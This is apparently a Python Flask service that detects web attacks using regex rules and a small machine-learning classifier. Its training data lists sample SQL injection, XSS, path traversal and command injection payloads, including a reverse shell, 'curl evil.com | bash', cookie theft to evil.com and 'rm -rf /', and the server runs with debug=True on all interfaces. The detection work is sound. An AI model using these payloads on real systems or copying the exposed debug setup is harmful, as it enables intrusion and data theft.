"""
WEJÀ AI Engine - Hybrid Attack Detection Service
Combines rule-based pattern matching with ML-based confidence scoring.
"""

import re
import numpy as np
from flask import Flask, request, jsonify
from flask_cors import CORS

# ML imports
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.preprocessing import LabelEncoder

app = Flask(__name__)
CORS(app)

# ============ ML MODEL TRAINING DATA ============
# Sample training data for the ML model
TRAINING_DATA = [
    # SQL Injection samples
    ("' OR 1=1 --", "SQL_INJECTION"),
    ("'; DROP TABLE users; --", "SQL_INJECTION"),
    ("1' AND '1'='1", "SQL_INJECTION"),
    ("admin'--", "SQL_INJECTION"),
    ("' UNION SELECT * FROM users --", "SQL_INJECTION"),
    ("1; SELECT * FROM information_schema.tables", "SQL_INJECTION"),
    ("' OR 'x'='x", "SQL_INJECTION"),
    ("1' OR '1'='1' /*", "SQL_INJECTION"),
    ("'; EXEC xp_cmdshell('dir'); --", "SQL_INJECTION"),
    ("1 AND 1=1 UNION SELECT null, username, password FROM users", "SQL_INJECTION"),
    
    # XSS samples
    ("<script>alert('XSS')</script>", "XSS"),
    ("<img src=x onerror=alert(1)>", "XSS"),
    ("javascript:alert(document.cookie)", "XSS"),
    ("<svg onload=alert(1)>", "XSS"),
    ("<body onload=alert('XSS')>", "XSS"),
    ("<iframe src='javascript:alert(1)'>", "XSS"),
    ("'\"><script>alert(String.fromCharCode(88,83,83))</script>", "XSS"),
    ("<input onfocus=alert(1) autofocus>", "XSS"),
    ("document.location='http://evil.com?c='+document.cookie", "XSS"),
    ("<div style=\"background:url(javascript:alert('XSS'))\">", "XSS"),
    
    # Path Traversal samples
    ("../../../etc/passwd", "PATH_TRAVERSAL"),
    ("....//....//etc/passwd", "PATH_TRAVERSAL"),
    ("%2e%2e%2f%2e%2e%2fetc/passwd", "PATH_TRAVERSAL"),
    ("..\\..\\..\\windows\\system32\\config\\sam", "PATH_TRAVERSAL"),
    ("/var/www/../../etc/shadow", "PATH_TRAVERSAL"),
    ("file:///etc/passwd", "PATH_TRAVERSAL"),
    ("....//....//....//etc/passwd", "PATH_TRAVERSAL"),
    ("%252e%252e%252fetc/passwd", "PATH_TRAVERSAL"),
    
    # Command Injection samples
    ("; ls -la", "COMMAND_INJECTION"),
    ("| cat /etc/passwd", "COMMAND_INJECTION"),
    ("`whoami`", "COMMAND_INJECTION"),
    ("$(cat /etc/passwd)", "COMMAND_INJECTION"),
    ("; rm -rf /", "COMMAND_INJECTION"),
    ("&& wget http://evil.com/shell.sh", "COMMAND_INJECTION"),
    ("| nc -e /bin/sh 10.0.0.1 4444", "COMMAND_INJECTION"),
    ("; curl http://evil.com/malware | bash", "COMMAND_INJECTION"),
    
    # Safe/Normal samples
    ("Hello World", "SAFE"),
    ("Search for products", "SAFE"),
    ("user@example.com", "SAFE"),
    ("Contact us for more information", "SAFE"),
    ("Add item to cart", "SAFE"),
    ("View order history", "SAFE"),
    ("Update profile settings", "SAFE"),
    ("Download invoice PDF", "SAFE"),
    ("GET /api/users/123", "SAFE"),
    ("POST /api/orders", "SAFE"),
    ("username=john&password=secret123", "SAFE"),
    ("filter=price&sort=asc", "SAFE"),
]

# Initialize ML model
print("[*] Training ML model...")
texts = [t[0] for t in TRAINING_DATA]
labels = [t[1] for t in TRAINING_DATA]

# Feature extraction
vectorizer = TfidfVectorizer(
    analyzer='char',
    ngram_range=(2, 5),
    max_features=1000
)
X = vectorizer.fit_transform(texts)

# Label encoding
label_encoder = LabelEncoder()
y = label_encoder.fit_transform(labels)

# Train model
ml_model = LogisticRegression(max_iter=1000)
ml_model.fit(X, y)
print("[OK] ML model trained successfully!")


def predict_threat(request_text: str) -> tuple:
    """
    Use ML model to predict threat type and confidence.
    Returns: (predicted_type, confidence_score)
    """
    if not request_text or len(request_text.strip()) == 0:
        return "SAFE", 0.1
    
    try:
        # Transform input text
        X_new = vectorizer.transform([request_text])
        
        # Get prediction probabilities
        probs = ml_model.predict_proba(X_new)[0]
        predicted_class = np.argmax(probs)
        confidence = float(probs[predicted_class])
        
        # Decode label
        predicted_label = label_encoder.inverse_transform([predicted_class])[0]
        
        return predicted_label, confidence
    except Exception as e:
        app.logger.error(f"ML prediction error: {e}")
        return "SAFE", 0.1


# ============ RULE-BASED DETECTION PATTERNS ============

SQLI_PATTERNS = [
    r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
    r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
    r"\w*((\%27)|(\'))((\\%6F)|o|(\%4F))((\%72)|r|(\%52))",
    r"((\%27)|(\'))union",
    r"exec(\s|\+)+(s|x)p\w+",
    r"(select|insert|update|delete|drop|truncate|alter)\s",
    r"(\%27)|(\')\s*(or|and)\s*\d+\s*=\s*\d+",
    r"1\s*=\s*1",
    r"\'\s*or\s*\'",
]

XSS_PATTERNS = [
    r"<script[^>]*>.*?</script>",
    r"javascript\s*:",
    r"on\w+\s*=",
    r"<\s*img[^>]+onerror",
    r"<\s*svg[^>]+onload",
    r"<\s*iframe",
    r"<\s*embed",
    r"<\s*object",
    r"expression\s*\(",
    r"alert\s*\(",
    r"document\.(cookie|location|write)",
    r"eval\s*\(",
]

PATH_TRAVERSAL_PATTERNS = [
    r"\.\./",
    r"\.\.\\",
    r"%2e%2e%2f",
    r"%252e%252e%252f",
    r"etc/passwd",
    r"etc/shadow",
    r"windows/system32",
]

COMMAND_INJECTION_PATTERNS = [
    r";\s*(ls|cat|whoami|id|pwd|uname)",
    r"\|\s*(ls|cat|whoami|id|pwd|uname)",
    r"`[^`]+`",
    r"\$\([^)]+\)",
    r"&&\s*(ls|cat|whoami|id|pwd|uname)",
]


def rule_based_detect(payload: str) -> tuple:
    """
    Rule-based pattern matching detection.
    Returns: (is_malicious, attack_type, confidence)
    """
    payload_lower = payload.lower()
    
    for pattern in SQLI_PATTERNS:
        if re.search(pattern, payload_lower, re.IGNORECASE):
            return True, "SQL_INJECTION", 0.90
    
    for pattern in XSS_PATTERNS:
        if re.search(pattern, payload_lower, re.IGNORECASE):
            return True, "XSS", 0.88
    
    for pattern in PATH_TRAVERSAL_PATTERNS:
        if re.search(pattern, payload_lower, re.IGNORECASE):
            return True, "PATH_TRAVERSAL", 0.92
    
    for pattern in COMMAND_INJECTION_PATTERNS:
        if re.search(pattern, payload_lower, re.IGNORECASE):
            return True, "COMMAND_INJECTION", 0.94
    
    return False, "SAFE", 0.1


def detect_attack_type(payload: str) -> tuple:
    """
    Hybrid detection combining rule-based and ML approaches.
    Returns: (is_malicious, attack_type, confidence)
    """
    # Get rule-based result
    rule_detected, rule_type, rule_conf = rule_based_detect(payload)
    
    # Get ML result
    ml_type, ml_conf = predict_threat(payload)
    
    # Combine results with weighted scoring
    if rule_detected:
        # Boost confidence if both methods agree
        if rule_type == ml_type:
            combined_conf = min(0.99, (rule_conf * 0.6 + ml_conf * 0.4) + 0.05)
        else:
            combined_conf = rule_conf
        return True, rule_type, round(combined_conf, 2)
    
    # If rule-based didn't detect but ML has high confidence
    if ml_type != "SAFE" and ml_conf > 0.7:
        return True, ml_type, round(ml_conf * 0.85, 2)
    
    # No threat detected
    return False, "SAFE", round(max(1 - ml_conf, 0.05), 2)


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint."""
    return jsonify({
        "status": "healthy",
        "service": "WEJÀ AI Engine",
        "version": "1.1.0",
        "ml_model": "LogisticRegression",
        "detection": "Hybrid (Rule-based + ML)"
    })


@app.route('/analyze', methods=['POST'])
def analyze_request():
    """
    Analyze incoming request payload for potential attacks.
    
    Expected JSON body:
    {
        "payload": "string to analyze",
        "headers": {},
        "method": "GET|POST|...",
        "path": "/target/path"
    }
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({
                "error": "No JSON body provided",
                "blocked": False,
                "confidence": 0.0,
                "type": "UNKNOWN"
            }), 400
        
        payload = data.get('payload', '')
        path = data.get('path', '')
        method = data.get('method', 'GET')
        
        combined_payload = f"{payload} {path}"
        
        # Perform hybrid detection
        is_blocked, attack_type, confidence = detect_attack_type(combined_payload)
        
        # Get ML prediction for additional info
        ml_type, ml_conf = predict_threat(combined_payload)
        
        response = {
            "blocked": is_blocked,
            "confidence": confidence,
            "type": attack_type,
            "analyzed_method": method,
            "analyzed_path": path,
            "payload_length": len(payload),
            "ml_prediction": ml_type,
            "ml_confidence": round(ml_conf, 2)
        }
        
        if is_blocked:
            app.logger.warning(f"🚨 Attack detected: {attack_type} (confidence: {confidence})")
        else:
            app.logger.info(f"✅ Request clean (confidence: {confidence})")
        
        return jsonify(response)
    
    except Exception as e:
        app.logger.error(f"Analysis error: {str(e)}")
        return jsonify({
            "error": str(e),
            "blocked": False,
            "confidence": 0.0,
            "type": "ERROR"
        }), 500


if __name__ == '__main__':
    print("[WEJA] AI Engine starting...")
    print("[*] Listening on http://localhost:5000")
    print("[*] Using hybrid detection: Rule-based + ML (LogisticRegression)")
    app.run(host='0.0.0.0', port=5000, debug=True)
